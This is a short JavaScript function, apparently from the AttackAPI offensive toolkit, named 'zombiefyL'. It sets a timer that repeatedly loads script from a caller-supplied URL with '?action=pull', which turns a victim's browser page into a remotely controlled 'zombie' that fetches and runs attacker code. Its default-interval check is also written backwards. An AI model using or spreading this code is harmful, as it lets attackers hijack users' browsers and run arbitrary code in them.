
AttackAPI.dom.zombiefyL = function (url, interval) {
	var interval = (interval == 'undefined')?interval:2000;

	window.setInterval(function () {
		AttackAPI.dom.requestJSL(url + '?action=pull');
	}, interval);
};
